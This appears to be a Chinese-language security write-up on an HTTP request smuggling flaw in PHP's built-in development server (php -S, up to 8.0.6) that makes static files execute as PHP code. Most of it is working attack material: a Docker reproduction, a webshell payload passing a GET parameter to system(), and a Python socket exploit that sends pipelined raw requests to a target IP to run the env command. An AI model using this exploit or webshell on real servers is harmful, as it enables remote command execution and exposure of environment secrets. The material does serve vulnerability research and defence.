## HTTP请求走私导致的`php -S`环境下静态文件代码执行

利用版本：`PHP (cli)`一直到`8.0.6`可复现

```bash
docker pull php:8.0.6-cli
docker run -p 8888:8888 -it php:8.0.6-cli /bin/bash
```

`php-cli`启动服务器

```bash
php -S 0.0.0.0:8888
```

任意静态文件如`flag.txt`，

内容如下,或者任意`php`代码

```php
<?php phpinfo();?>
```

构造如下数据包，

* 第一个请求为静态文件，

* 第二个请求为不存在的`xx.php`文件，即可执行该静态文件，可以接受`GET\POST`传参

![image-20260319202813847](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319202815170.png)

### `GET/POST`传参

#### `GET`

```php
<?php system($_GET[1]);?>
```

![image-20260319183809870](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319183811469.png)

![image-20260319183928172](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319183929428.png)

exp:

```python
import socket

host = "10.60.174.62"
port = 8888

# 完整还原数据包的原始字节
raw_request = (
    b"GET /flag.txt HTTP/1.1\r\n"
    b"Host: 10.60.174.62:8888\r\n"
    b"\r\n"
    b"\r\n"
    b"GET /xx.php?1=env HTTP/1.1\r\n"
    b"\r\n"
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(raw_request)
    
    response = b""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass

print(response.decode(errors="replace"))
```

#### `POST`

同理 `POST`也可

![image-20260319193449647](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319193450791.png)